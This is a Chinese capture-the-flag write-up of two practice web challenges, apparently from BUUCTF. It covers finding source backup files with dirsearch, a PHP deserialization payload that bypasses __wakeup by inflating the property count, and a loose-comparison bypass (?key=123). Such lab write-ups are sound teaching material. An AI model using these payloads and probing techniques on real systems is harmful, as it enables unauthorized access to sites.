# [极客大挑战 2019]PHP 1

1. 一进入题目，就有页面提示我们“所以我有一个良好的备份网站的习惯”
2. 所以我们尝试着输入网站源码备份文件，看看能否访问

    常见的网站源码备份文件后缀:

    tar.gz，zip，rar，tar，bak，swp

    常见的网站源码备份文件名：

    web，website，backup，back，www，wwwroot，temp
3. 发现www.zip可以成功获得网站源码备份
4. 下载后，发现有3个php文件
5. 我们先访问一下 index.php文件，发现文件包含 class.php 文件 并且文件是get 传参，参数为 select

   unserialize 函数允许将序列化后的数据转换回原始的 PHP 对象或数据结构，并在必要时通过调用 __wakeup() 方法来执行一些额外的操作

   __wakeup() 是一个特殊的魔术方法，用于在对象从序列化状态被恢复时执行某些操作。开发者可以在这个方法中实现任何必要的初始化逻辑，例如重新连接到数据库、重新打开文件或执行其他必要的操作
6. 访问 class.php
```php
 <?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```
7. 设置两个私有变量 ，利用 __construct 构造函数 来进行一个一一对应的关系,之后__wakeup() 让 username 变量等于 guest

    在类结束的时候，调用__desctruct()函数 ，如果这个 password不等于100 ，就会输出 username… password… ，退出函数。如果 username= admine 就会输出 flag 否则 失败。

    在本题的关键，就是username的赋值 因为 __wakeup 会对userneme进行一次赋值，所以我们要想办法绕过该函数， 并且在一开始我们要改变 username的赋值
>当成员属性数目大于实际数目时可绕过wakeup方法
8. 构造payload
```php
<?php
class Name{
    private $username = 'admine';
    private $password = '100';
}
$select = new Name();
$res=serialize(@$select);
echo $res
?> 
```
即O:4:"Name":2:{s:14:"%00Name%00username";s:6:"admine";s:14:"%00Name%00password";s:3:"100";}
8. 因为当成员属性数目大于实际数目时才可绕过wakeup

   所以我们要将 2 改为 3 或者 比二大的数字
9. ?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}

# [ACTF2020 新生赛]BackupFile 1

1. 题目有提示:Backup file,翻译成中文就是备份文件的意思
2. 扫描python3 dirsearch.py -u http://62b4c3e1-0c2e-4913-bbb0-f4c4dcf76ffb.node5.buuoj.cn:81/ -e*
3. 找到/index.php.bak的文件
4. 查看PHP代码
```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
$str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
if($key == $str) {
    echo $flag;
}

}
else {
    echo "Try to find out source file!";
} 
```
5. 是弱类型的比较题

   在PHP中:

   = = 为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如a=123和b=123admin456进行= =比较时。则b只会截取前面的整数部分。即b转化成123

   所以，这里的a = = b是返回True

   所以这里我们只需要提供一个参数?key=123就可以拿到flag了
